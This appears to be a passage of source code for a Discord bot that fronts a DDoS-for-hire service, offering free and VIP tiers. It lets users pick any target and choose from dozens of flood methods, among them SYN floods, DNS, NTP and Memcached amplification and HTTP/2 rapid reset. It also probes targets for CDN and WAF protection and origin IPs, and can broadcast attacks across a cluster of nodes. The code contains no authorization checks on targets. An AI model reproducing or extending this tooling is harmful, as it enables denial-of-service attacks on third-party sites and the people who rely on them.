      .setDefault(d.value === selectedDuration);

  const mkThreadOpt = (t: typeof THREAD_OPTIONS[0]) =>
    new StringSelectMenuOptionBuilder()
      .setValue(t.value)
      .setLabel(t.label)
      .setDescription(t.description)
      .setDefault(t.value === selectedThreads);

  // Duration and thread pools (filtered by tier)
  const durOpts    = isVip ? DURATION_OPTIONS    : FREE_DURATION_OPTIONS;
  const threadOpts = isVip ? THREAD_OPTIONS      : FREE_THREAD_OPTIONS;

  const durationMenu = new StringSelectMenuBuilder()
    .setCustomId("select_duration")
    .setPlaceholder("⏱ Duração (padrão: 60s)")
    .addOptions(durOpts.map(mkDurOpt));

  const threadMenu = new StringSelectMenuBuilder()
    .setCustomId("select_threads")
    .setPlaceholder("⚡ Power (padrão: 4 — ~2.000 conns)")
    .addOptions(threadOpts.map(mkThreadOpt));

  if (!isVip) {
    // Free: single method menu with 7 allowed methods
    const freeMethodMenu = new StringSelectMenuBuilder()
      .setCustomId("select_method")
      .setPlaceholder("⚔️ Método de Ataque — Plano Free (7 disponíveis)...")
      .addOptions(FREE_METHOD_OPTIONS.map(mkMethodOpt));
    return [
      new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(freeMethodMenu),
      new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(durationMenu),
      new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(threadMenu),
    ];
  }

  // VIP: two method menus (all 50 methods)
  const methodMenuA = new StringSelectMenuBuilder()
    .setCustomId("select_method")
    .setPlaceholder("⚔️ Método — Hydra / L7 / L4 / L3 (1-25)...")
    .addOptions(METHOD_OPTIONS_A.map(mkMethodOpt));

  const methodMenuB = new StringSelectMenuBuilder()
    .setCustomId("select_method_2")
    .setPlaceholder("🌀 Método — ARES OMNIVECT ∞ (26-50)...")
    .addOptions(METHOD_OPTIONS_B.map(mkMethodOpt));

  return [
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenuA),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenuB),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(durationMenu),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(threadMenu),
  ];
}

function buildLauncherEmbed(target: string, session: LaunchSession, selectedMethod?: string): EmbedBuilder {
  const mInfo = selectedMethod ? METHOD_OPTIONS.find(m => m.value === selectedMethod) : null;
  const isVip = session.isVip ?? false;

  // ── Tier info ─────────────────────────────────────────────────────────────
  const tierLine = isVip
    ? "👑 **VIP** — Power 1–8 · até 600s · todos os métodos desbloqueados"
    : `🔓 **Free** — Power máx **${MAX_POWER_FREE}** · até **${MAX_DURATION_FREE}s** · ${FREE_METHODS.size} métodos disponíveis`;

  // ── Config summary ────────────────────────────────────────────────────────
  const powerLabel   = `⚡ **Power ${session.threads}**/${isVip ? "8" : MAX_POWER_FREE}`;
  const durationLabel= `⏱ **${session.duration}s**`;
  const methodLabel  = mInfo
    ? `${mInfo.emoji ?? "⚡"} **${mInfo.label}**`
    : "⚔️ _nenhum selecionado_";

  const configLine = `\`${target}\`\n${methodLabel}  ·  ${durationLabel}  ·  ${powerLabel}`;

  // ── Description ───────────────────────────────────────────────────────────
  const instructionLine = mInfo
    ? `✅ Método selecionado — ajuste duração & power se quiser, depois clique **🚀 DISPARAR**`
    : `1️⃣ Escolha um **método** no menu abaixo\n2️⃣ Ajuste **duração** e **power** se quiser\n3️⃣ Clique **🚀 DISPARAR** para lançar`;

  const embed = new EmbedBuilder()
    .setColor(mInfo ? COLORS.CRIMSON : COLORS.GOLD)
    .setTitle("⚔️ GEASS LAUNCHER — CONFIGURAÇÃO DO ATAQUE")
    .setDescription(`${tierLine}\n\n${instructionLine}`)
    .addFields({ name: "🎯 Configuração Atual", value: configLine, inline: false });

  // ── Method description ────────────────────────────────────────────────────
  if (mInfo?.description) {
    embed.addFields({
      name:   "📋 Como funciona",
      value:  `> ${mInfo.description.slice(0, 300)}`,
      inline: false,
    });
  } else if (!isVip) {
    // Show free method list for unselected state
    const freeMethodList = FREE_METHOD_OPTIONS
      .map(m => `${m.emoji ?? "⚡"} ${m.label}`)
      .join("\n");
    embed.addFields({
      name:   `🔓 Métodos disponíveis no Free (${FREE_METHODS.size})`,
      value:  freeMethodList,
      inline: false,
    });
  }

  embed
    .setFooter({ text: `${AUTHOR} • ${isVip ? "👑 VIP — acesso total" : "🔓 Free — use /vip status para ver seus limites"}` })
    .setTimestamp();

  return embed;
}

// ── Command Handlers ──────────────────────────────────────────────────────────
async function handleAttackStart(interaction: ChatInputCommandInteraction): Promise<void> {
  // Guard: Discord occasionally delivers the same interaction twice during reconnects.
  // Replying to an already-acknowledged interaction throws DiscordAPIError[40060].
  if (interaction.replied || interaction.deferred) return;

  const target  = interaction.options.getString("target", true);
  const userId  = interaction.user.id;

  // ── Cooldown check — 30s between launches ─────────────────────────────
  const lastLaunch = attackCooldowns.get(userId);
  if (lastLaunch) {
    const elapsed  = Date.now() - lastLaunch;
    const remaining = Math.ceil((ATTACK_COOLDOWN_MS - elapsed) / 1000);
    if (elapsed < ATTACK_COOLDOWN_MS) {
      await interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GOLD)
            .setTitle("⏳ GEASS EM RECARGA")
            .setDescription(
              `> *"Mesmo a Hydra precisa de um momento para se concentrar. A paciência é uma arma, não uma fraqueza."*\n\n` +
              `Aguarde **${remaining}s** antes de lançar outro ataque.`
            )
            .setFooter({ text: `${AUTHOR} • Cooldown: ${ATTACK_COOLDOWN_MS / 1000}s` })
            .setTimestamp(),
        ],
        flags: MessageFlags.Ephemeral,
      });
      return;
    }
  }
  attackCooldowns.set(userId, Date.now());

  // Fetch user tier to enforce limits and show correct badge in embed
  const isPrivileged = isOwner(userId, interaction.user.username) || isMod(userId, interaction.user.username);
  let isVip = isPrivileged; // owners/mods always bypass
  if (!isPrivileged) {
    const tierData = await api.getUserTier(userId).catch(() => ({ tier: "free", expiresAt: null }));
    isVip = tierData.tier === "vip" && (!tierData.expiresAt || new Date(tierData.expiresAt) > new Date());
  }

  // Init session with defaults — auto-expires in 5 minutes if abandoned
  const session: LaunchSession = { target, duration: 60, threads: 4, isVip };
  pendingSessions.set(userId, session);
  scheduleSessionExpiry(userId);

  const components = buildLauncherComponents(target, isVip);
  // Linha de botões — DISPARAR desabilitado até o usuário escolher um método
  const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("launch_attack")
      .setLabel("🚀 DISPARAR")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(true),
    new ButtonBuilder()
      .setCustomId("cancel_launch")
      .setLabel("✖ Cancelar")
      .setStyle(ButtonStyle.Secondary),
  );

  await interaction.reply({
    embeds: [buildLauncherEmbed(target, session)],
    components: [...components, buttonRow],
  });
}

function cleanupMonitor(id: number): void {
  const timer = monitors.get(id);
  if (timer) clearInterval(timer);
  monitors.delete(id);
  prevPackets.delete(id);
  targetHistories.delete(id);
  downAlertSent.delete(id);
}

async function handleAttackStop(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const id = interaction.options.getInteger("id", true);
  console.log(`[ATTACK STOP] ${interaction.user.tag} → #${id}`);
  try {
    const result = await api.stopAttack(id);
    const ok     = result?.ok ?? false;
    cleanupMonitor(id);
    await interaction.editReply({
      embeds: [buildStopEmbed(id, ok, "pt")],
      components: [buildLangRow("pt", "stop")],
    });
    console.log(`[ATTACK #${id}] ${ok ? "Stopped" : "Stop failed"}`);
  } catch {
    await interaction.editReply({ embeds: [buildStopEmbed(id, false, "pt")], components: [buildLangRow("pt", "stop")] });
  }
}

async function handleAttackList(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const attacks = await api.getAttacks();
    const msg = await interaction.editReply({
      embeds: [buildListEmbed(attacks, "pt")],
      components: [buildLangRow("pt", "list")],
    });
    listCache.set(msg.id, attacks);
    setTimeout(() => listCache.delete(msg.id), 1_800_000);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("FETCH FAILED", message)] });
  }
}

const healthCache = new Map<string, { h: HealthData; stats: GlobalStats | null }>();

async function handleStats(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const lang: "en" | "pt" = "pt";
  try {
    const [healthRes, stats] = await Promise.all([
      fetch(`${API_BASE}/api/health/live`, { signal: AbortSignal.timeout(3000) }),
      api.getStats().catch(() => null),
    ]);
    if (!healthRes.ok) {
      await interaction.editReply({ embeds: [buildErrorEmbed("HEALTH FAILED", `HTTP ${healthRes.status}`)] });
      return;
    }
    const h = (await healthRes.json()) as HealthData;
    const embed  = buildHealthEmbed(h, stats, lang);
    const msg    = await interaction.editReply({ embeds: [embed], components: [buildLangRow(lang, "health")] });
    healthCache.set(msg.id, { h, stats });
    setTimeout(() => healthCache.delete(msg.id), 300_000);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("STATS FAILED", message)] });
  }
}

async function handleAttackStats(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const [stats, proxyStats] = await Promise.all([
      api.getStats(),
      api.getProxyStats().catch(() => undefined),
    ]);
    const msg = await interaction.editReply({
      embeds: [buildStatsEmbed(stats, proxyStats ?? undefined, "pt")],
      components: [buildLangRow("pt", "stats")],
    });
    statsCache.set(msg.id, { stats, proxyStats: proxyStats ?? undefined });
    setTimeout(() => statsCache.delete(msg.id), 1_800_000);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("STATS FAILED", message)] });
  }
}

const checkCache = new Map<string, CheckResult>();

// Detect CDN/WAF from response headers
function detectCdnAndProtection(headers: Headers): { cdn: string | null; protection: string | null; cfRay: string | null; xCache: string | null } {
  const server    = (headers.get("server") ?? "").toLowerCase();
  const via       = (headers.get("via") ?? "").toLowerCase();
  const xPowered  = (headers.get("x-powered-by") ?? "").toLowerCase();
  const cfRay     = headers.get("cf-ray") ?? null;
  const xCache    = headers.get("x-cache") ?? headers.get("x-cache-status") ?? null;
  const xAmz      = headers.get("x-amz-cf-id") ?? headers.get("x-amz-request-id");
  const xSucuri   = headers.get("x-sucuri-id") ?? headers.get("x-sucuri-cache");
  const xAkamai   = headers.get("x-akamai-request-id") ?? headers.get("x-check-cacheable");
  const xFastly   = headers.get("x-fastly-request-id") ?? headers.get("fastly-debug-digest");
  const xVarnish  = headers.get("x-varnish");

  let cdn: string | null = null;
  let protection: string | null = null;

  if (cfRay || server.includes("cloudflare") || via.includes("cloudflare"))   cdn = "Cloudflare";
  else if (xAmz || server.includes("amazons3") || server.includes("cloudfront")) cdn = "AWS CloudFront";
  else if (xAkamai || via.includes("akamai"))                                  cdn = "Akamai";
  else if (xFastly || via.includes("fastly"))                                  cdn = "Fastly";
  else if (xVarnish || server.includes("varnish"))                             cdn = "Varnish Cache";
  else if (via.includes("squid"))                                               cdn = "Squid Proxy";
  else if (server.includes("bunny") || headers.get("bunny-request-id"))        cdn = "BunnyCDN";
  else if (headers.get("x-vercel-id") || server.includes("vercel"))            cdn = "Vercel Edge";
  else if (headers.get("x-netlify-id") || server.includes("netlify"))          cdn = "Netlify Edge";

  if (xSucuri)                                                                  protection = "Sucuri WAF";
  else if (headers.get("x-waf-event-info") || headers.get("x-fw-type"))        protection = "Fortinet WAF";
  else if (headers.get("x-distil-cs"))                                          protection = "Distil Networks";
  else if (headers.get("x-datadome-cid"))                                       protection = "DataDome Bot Mgmt";
  else if (headers.get("x-px-authorization") || headers.get("x-perimeterx"))   protection = "PerimeterX";
  else if (cfRay)                                                                protection = "Cloudflare";
  else if (xPowered.includes("imperva") || server.includes("incapsula"))        protection = "Imperva WAF";

  return { cdn, protection, cfRay, xCache };
}

async function handleCheck(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  let rawTarget = interaction.options.getString("target", true).trim();
  if (!/^https?:\/\//i.test(rawTarget)) rawTarget = `https://${rawTarget}`;

  console.log(`[CHECK] ${interaction.user.tag} → ${rawTarget}`);
  const lang: "en" | "pt" = "pt";

  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle("🌐 VERIFICANDO SITE...")
        .setDescription(`Enviando **3 probes paralelas** para \`${rawTarget}\`...`)
        .setFooter({ text: AUTHOR }),
    ],
  });

  // Fire 3 independent probes simultaneously for reliability
  const PROBES = 3;
  const PROBE_TIMEOUT = 7000;
  const hdrs = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
    "Cache-Control":   "no-cache, no-store",
    "Pragma":          "no-cache",
  };

  type SingleCheckResult = {
    ok:           boolean;
    statusCode:   number | null;
    latencyMs:    number;
    serverHeader: string | null;
    contentType:  string | null;
    redirected:   boolean;
    finalUrl:     string | null;
    headers?:     Headers;
    error:        string | null;
  };

  const runProbe = async (): Promise<SingleCheckResult> => {
    const t0   = Date.now();
    const ctrl = new AbortController();
    const tid  = setTimeout(() => ctrl.abort(), PROBE_TIMEOUT);
    try {
      const res = await fetch(rawTarget, { method: "HEAD", redirect: "follow", signal: ctrl.signal, headers: hdrs });
      clearTimeout(tid);
      const latencyMs = Date.now() - t0;
      return {
        ok:           res.status < 500,
        statusCode:   res.status,
        latencyMs,
        serverHeader: res.headers.get("server") ?? res.headers.get("x-powered-by") ?? null,
        contentType:  null, // HEAD won't have it; will use GET fallback below
        redirected:   res.redirected,
        finalUrl:     res.redirected ? res.url : null,
        headers:      res.headers,
        error:        null,
      };
    } catch (err: unknown) {
      clearTimeout(tid);
      const latencyMs = Date.now() - t0;
      return {
        ok: false, statusCode: null, latencyMs,
        serverHeader: null, contentType: null, redirected: false, finalUrl: null,
        error: err instanceof Error ? err.message : String(err),
      };
    }
  };

  // Fire all probes in parallel
  const probeResults = await Promise.all(Array.from({ length: PROBES }, runProbe));

  let successfulProbes = probeResults.filter(p => p.ok && p.statusCode !== null);
  let anySuccess       = successfulProbes.length > 0;

  // ── Proxy fallback: if ALL direct probes failed, try via the API server's proxy pool ──
  // This handles cases where the target blocks Replit datacenter IPs (Cloudflare, Akamai, etc.)
  let proxyFallbackUsed = false;
  if (!anySuccess) {
    const proxied = await apiProbe(rawTarget);
    if (proxied && proxied.statusCode !== null) {
      const fallback: SingleCheckResult = {
        ok:           proxied.up,
        statusCode:   proxied.statusCode,
        latencyMs:    proxied.latencyMs,
        serverHeader: proxied.serverHeader,
        contentType:  null,
        redirected:   proxied.redirected,
        finalUrl:     proxied.finalUrl,
        headers:      undefined,
        error:        proxied.error ?? null,
      };
      probeResults.splice(0, probeResults.length, fallback, fallback, fallback);
      successfulProbes = probeResults.filter(p => p.ok && p.statusCode !== null);
      anySuccess       = successfulProbes.length > 0;
      proxyFallbackUsed = true;
    }
  }

  // One GET probe for content-type and CDN headers (only if at least one HEAD succeeded)
  let getResult: SingleCheckResult | null = null;
  if (anySuccess && !proxyFallbackUsed) {
    getResult = await runProbe().then(async () => {
      const t0   = Date.now();
      const ctrl = new AbortController();
      const tid  = setTimeout(() => ctrl.abort(), PROBE_TIMEOUT);
      try {
        const res = await fetch(rawTarget, { method: "GET", redirect: "follow", signal: ctrl.signal, headers: hdrs });
        clearTimeout(tid);
        return {
          ok:           res.status < 500,
          statusCode:   res.status,
          latencyMs:    Date.now() - t0,
          serverHeader: res.headers.get("server") ?? res.headers.get("x-powered-by") ?? null,
          contentType:  res.headers.get("content-type"),
          redirected:   res.redirected,
          finalUrl:     res.redirected ? res.url : null,
          headers:      res.headers,
          error:        null,
        } satisfies SingleCheckResult;
      } catch (err: unknown) {
        clearTimeout(tid);
        return { ok: false, statusCode: null, latencyMs: Date.now() - t0, serverHeader: null, contentType: null, redirected: false, finalUrl: null, error: err instanceof Error ? err.message : String(err) } satisfies SingleCheckResult;
      }
    });
  }

  // Aggregate results
  const allTimes   = probeResults.map(p => p.latencyMs);
  const bestMs     = Math.min(...allTimes);
  const worstMs    = Math.max(...allTimes);
  const avgMs      = Math.round(allTimes.reduce((a, b) => a + b, 0) / allTimes.length);

  // Representative probe: prefer a successful one, else first
  const rep = successfulProbes[0] ?? probeResults[0];

  // CDN/protection detection from headers
  const refHeaders = getResult?.headers ?? rep.headers;
  const { cdn, protection, cfRay, xCache } = refHeaders ? detectCdnAndProtection(refHeaders) : { cdn: null, protection: null, cfRay: null, xCache: null };

  // Main error message from probe failures
  const errorMsg = !anySuccess
    ? (rep.error ?? probeResults.map(p => p.error).find(Boolean) ?? "All probes failed — target unreachable")
    : null;

  const result: CheckResult = {
    target:         rawTarget,
    statusCode:     rep.statusCode,
    responseTimeMs: rep.latencyMs,
    serverHeader:   getResult?.serverHeader ?? rep.serverHeader,
    contentType:    getResult?.contentType ?? null,
    redirected:     rep.redirected,
    finalUrl:       rep.finalUrl,
    httpVersion:    null,
    error:          errorMsg,
    probeCount:     PROBES,
    bestMs,
    worstMs,
    avgMs,
    successCount:   successfulProbes.length,
    cdn,
    protection,
    cfRay,
    xCacheHeader:   xCache,
  };

  const embed = buildCheckEmbed(result, lang);
  const msg   = await interaction.editReply({ embeds: [embed], components: [buildLangRow(lang, "check")] });
  checkCache.set(msg.id, result);
  setTimeout(() => checkCache.delete(msg.id), 1_800_000);
}

async function handleAnalyze(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target = interaction.options.getString("target", true);
  console.log(`[ANALYZE] ${interaction.user.tag} → ${target}`);
  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle("🔍 SCANNING TARGET...")
        .setDescription(`Analisando \`${target}\`\nDNS probes, HTTP fingerprinting, CDN/WAF, Origin IP discovery...`)
        .setFooter({ text: AUTHOR })
    ],
  });
  try {
    const result = await api.analyze(target);
    const msg = await interaction.editReply({
      embeds: [buildAnalyzeEmbed(result, "pt")],
      files: buildGeassFiles(),
      components: [buildLangRow("pt", "analyze")],
    });
    analyzeCache.set(msg.id, result);
    setTimeout(() => analyzeCache.delete(msg.id), 3_600_000); // 1h TTL
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("ANALYSIS FAILED", message)] });
  }
}

async function handleMethods(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const layerFilter = interaction.options.getString("layer") ?? undefined;
  try {
    const methods   = await api.getMethods();
    const lang: "en" | "pt" = "pt";
    const page      = 1;
    const filtered  = layerFilter
      ? methods.filter(m => m.layer?.toLowerCase() === layerFilter.toLowerCase())
      : methods;
    const total     = Math.ceil(filtered.length / METHODS_PAGE_SIZE);
    const embed     = buildMethodsEmbed(methods, layerFilter, lang, page);
    const navRow    = buildMethodsNavRow(page, total, lang);
    const msg       = await interaction.editReply({ embeds: [embed], components: [navRow] });
    methodsCache.set(msg.id, { methods, layer: layerFilter, page, lang });
    setTimeout(() => methodsCache.delete(msg.id), 3_600_000);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("METHODS FAILED", message)] });
  }
}

// buildInfoLangRow replaced by buildLangRow("en"|"pt", "info") from embeds.ts

async function fetchInfoData() {
  const [stats, clusterStatus] = await Promise.allSettled([
    api.getStats(),
    api.getClusterStatus(),
  ]);
  const s = stats.status === "fulfilled" ? stats.value : null;
  const c = clusterStatus.status === "fulfilled" ? clusterStatus.value : null;
  return {
    guildCount:    botClient?.guilds.cache.size ?? 0,
    totalAttacks:  s?.totalAttacks   ?? 0,
    activeAttacks: s?.runningAttacks ?? 0,
    uptimeMs:      botClient?.uptime ?? 0,
    cpuCount:      s?.cpuCount,
    totalPackets:  s?.totalPacketsSent ?? 0,
    totalBytes:    s?.totalBytesSent   ?? 0,
    clusterNodes:  c?.configuredNodes  ?? 0,
  };
}

async function handleInfo(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const data  = await fetchInfoData();
    const embed = buildInfoEmbed({ ...data, lang: "en" });
    const row   = buildLangRow("en", "info");
    await interaction.editReply({ embeds: [embed], files: buildAttackFiles(), components: [row] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("INFO FAILED", message)] });
  }
}

async function handleHelp(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({
    embeds: [buildHelpEmbed("pt")],
    files: buildGeassFiles(),
    components: [buildLangRow("pt", "help")],
  });
}

async function handleCluster(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "status") {
    await interaction.deferReply();
    try {
      const status = await api.getClusterStatus();
      await interaction.editReply({
        embeds: [buildClusterEmbed(status, "en")],
        files: buildGeassFiles(),
        components: [buildLangRow("en", "cluster")],
      });
      // Store status for lang toggle re-render
      const msgId = (await interaction.fetchReply()).id;
      (interaction.client as unknown as Record<string, unknown>)[`cluster_status_${msgId}`] = status;
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("CLUSTER STATUS FAILED", message)] });
    }
    return;
  }

  if (sub === "broadcast") {
    const target   = interaction.options.getString("target", true);
    const duration = interaction.options.getInteger("duration") ?? 60;
    const threads  = interaction.options.getInteger("threads") ?? 4;
    const isHttps  = /^https:/i.test(target);
    const port     = isHttps ? 443 : 80;

    await interaction.deferReply();

    // Show loading state
    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.CRIMSON)
          .setTitle("👁️ CLUSTER BROADCAST — GEASS OVERRIDE FIRING...")
          .setDescription(
            `> *"By the power of Geass, I command ALL nodes — submit to my absolute authority!"*\n\n` +
            `🌐 Broadcasting **ARES OMNIVECT ∞** to **all cluster nodes** — 42 vectors × 10 machines`
          )
          .addFields(
            { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
            { name: "⏱ Duration", value: `**${duration}s**`,     inline: true },
            { name: "🧵 Threads", value: `**${threads}** / node`, inline: true },
          )
          .setFooter({ text: AUTHOR })
          .setTimestamp(),
      ],
    });

    try {
      // Fire the primary node — fan-out to all peers happens automatically server-side
      const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
      const clusterStatus = await api.getClusterStatus().catch(() => null);
      const nodesOnline   = clusterStatus?.totalOnline ?? 1;
      const row           = buildAttackButtons(attack.id, true);

      console.log(`[CLUSTER BROADCAST] ${interaction.user.tag} → ${target} | ${nodesOnline} nodes | ${threads}t | ${duration}s`);

      const _clusterMsg = await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.CRIMSON)
            .setTitle(`👁️ CLUSTER BROADCAST ACTIVE — ${nodesOnline} NODES FIRING`)
            .setDescription(
              `👁️ **ARES OMNIVECT ∞ × ${nodesOnline}** — All cluster nodes running 33 simultaneous attack vectors\n\n` +
              `Primary attack **#${attack.id}** monitoring below. Peer nodes fire independently.`
            )
            .setImage("attachment://hydra.gif")
            .setThumbnail("attachment://geass-symbol.png")
            .addFields(
              { name: "🎯 Target",         value: `\`${target}\``,           inline: true },
              { name: "⏱ Duration",        value: `**${duration}s**`,        inline: true },
              { name: "🧵 Threads/Node",   value: `**${threads}**`,          inline: true },
              { name: "🌐 Nodes Online",   value: `**${nodesOnline}**`,      inline: true },
              { name: "⚡ Total Vectors",  value: `**${nodesOnline * 42}** simultaneous`, inline: true },
              { name: "📊 Status",         value: "🔴 **ALL NODES INITIALIZING...**", inline: true },
            )
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
        components: [row],
        files: buildAttackFiles(),
      });

      const userId = interaction.user.id;
      startMonitor(attack.id, (opts) => interaction.editReply(opts), target, userId, interaction.channelId);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("BROADCAST FAILED", message)] });
    }
    return;
  }
}

async function handleGeass(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target   = interaction.options.getString("target", true);
  const duration = interaction.options.getInteger("duration") ?? 60;
  const threads  = interaction.options.getInteger("threads") ?? 4;
  const isHttps  = /^https:/i.test(target);
  const port     = isHttps ? 443 : 80;
  console.log(`[GEASS] ${interaction.user.tag} → ${target} | ${threads}t | ${duration}s`);

  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.CRIMSON)
        .setTitle("👁️ HYDRA COMMANDS YOU...")
        .setDescription(
          `> *"I, Hydra, hereby command all opposition... TO SUBMIT!"*\n\n` +
          `👁️ **GEASS OVERRIDE ∞ — ARES OMNIVECT ∞** — **30** simultaneous real attack vectors against \`${target}\`\n\n` +
          `**L7 App (12):** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → GraphQL → RUDY v2 → Cache Poison → HTTP Bypass → Keepalive Exhaust\n` +
          `**L7 H2 (4):** H2 Storm → HTTP Pipeline(300K/s) → H2 PING Storm → HTTP Smuggling\n` +
          `**TLS (3):** TLS Renego → SSL Death → QUIC/H3\n` +
          `**Extended App (3):** XML Bomb → Slow Read → Range Flood\n` +
          `**L4 (1):** SYN Flood · **L3 (5):** ICMP → DNS → NTP → Memcached → SSDP · **UDP (2):** UDP Flood → DoH Flood`
        )
        .addFields(
          { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
          { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
          { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
          { name: "📊 Status",   value: "🔴 **INITIALIZING 33 VECTORS — ARES OMNIVECT ∞ COMMAND...**", inline: false },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp()
    ],
  });

  try {
    const [attack, pStats] = await Promise.all([
      api.startAttack({ target, method: "geass-override", threads, duration, port }),
      api.getProxyStats().catch(() => undefined),
    ]);
    console.log(`[GEASS #${attack.id}] 30 Vectors online — ARES OMNIVECT ∞ → ${target}`);
    const row     = buildAttackButtons(attack.id, true);
    await interaction.editReply({ embeds: [buildStartEmbed(attack, pStats?.count ?? 0)], components: [row], files: buildAttackFiles() });
    const userId  = interaction.user.id;
    startMonitor(attack.id, (opts) => interaction.editReply(opts), target, userId);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("GEASS FAILED", message)] });
  }
}

// Per-user select-menu lock — prevents race when user selects two menus in rapid succession
const selectMenuLock = new Set<string>();

// ── Select Menu Handler ───────────────────────────────────────────────────────
async function handleSelectMenu(interaction: StringSelectMenuInteraction): Promise<void> {
  // ★ Acknowledge IMMEDIATELY — Discord invalidates the token after 3 seconds.
  // Using deferUpdate() here means we have up to 15 minutes for editReply().
  // NOT deferring is the root cause of DiscordAPIError[10062] (Unknown interaction).
  await interaction.deferUpdate();

  const userId  = interaction.user.id;
  const session = pendingSessions.get(userId);
  if (!session) return; // already deferred above — safe to return without editReply

  // Per-user lock: if a previous select menu update is still in-flight for this user,
  // just update state and skip the editReply — the in-flight one will use fresh state.
  if (selectMenuLock.has(userId)) {
    // Still update state even if we skip the visual update
    const value = interaction.values[0];
    if (interaction.customId === "select_method" || interaction.customId === "select_method_2") {
      pendingMethodMap.set(userId, value);
    } else if (interaction.customId === "select_duration") {
      session.duration = parseInt(value, 10);
      pendingSessions.set(userId, session);
    } else if (interaction.customId === "select_threads") {
      session.threads = parseInt(value, 10);
      pendingSessions.set(userId, session);
    }
    return;
  }

  selectMenuLock.add(userId);
  try {
    const value = interaction.values[0];

    if (interaction.customId === "select_method" || interaction.customId === "select_method_2") {
      pendingMethodMap.set(userId, value);
    } else if (interaction.customId === "select_duration") {
      session.duration = parseInt(value, 10);
      pendingSessions.set(userId, session);
    } else if (interaction.customId === "select_threads") {
      session.threads = parseInt(value, 10);
      pendingSessions.set(userId, session);
    }

    const currentMethod = pendingMethodMap.get(userId);

    const components = buildLauncherComponents(
      session.target,
      session.isVip ?? false,
      currentMethod,
      String(session.duration),
      String(session.threads),
    );
    const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder()
        .setCustomId("launch_attack")
        .setLabel("🚀 DISPARAR")
        .setStyle(ButtonStyle.Danger)
        .setDisabled(!currentMethod),
      new ButtonBuilder()
        .setCustomId("cancel_launch")
        .setLabel("✖ Cancelar")
        .setStyle(ButtonStyle.Secondary),
    );

    await interaction.editReply({
      embeds: [buildLauncherEmbed(session.target, session, currentMethod)],
      components: [...components, buttonRow],
    });
  } finally {
    selectMenuLock.delete(userId);
  }
}

// Track selected method separately (not in LaunchSession to keep it clean)
const pendingMethodMap = new Map<string, string>();

// ── Button Interaction Handler ────────────────────────────────────────────────
async function handleButton(interaction: import("discord.js").ButtonInteraction): Promise<void> {
  const { customId } = interaction;

  // ── Launch button ─────────────────────────────────────────────────────────
  if (customId === "launch_attack") {
    const userId  = interaction.user.id;
    const session = pendingSessions.get(userId);
    const method  = pendingMethodMap.get(userId);
    if (!session || !method) {
      await interaction.reply({ content: "❌ Sessão expirada. Use `/attack start` novamente.", flags: MessageFlags.Ephemeral });
      return;
    }

    // ── Tier validation (owners bypass) ─────────────────────────────────
    const isPrivileged = isOwner(userId, interaction.user.username) || isMod(userId, interaction.user.username);
    if (!isPrivileged) {
      const tierData = await api.getUserTier(userId);
      const isVip    = tierData.tier === "vip" && (!tierData.expiresAt || new Date(tierData.expiresAt) > new Date());
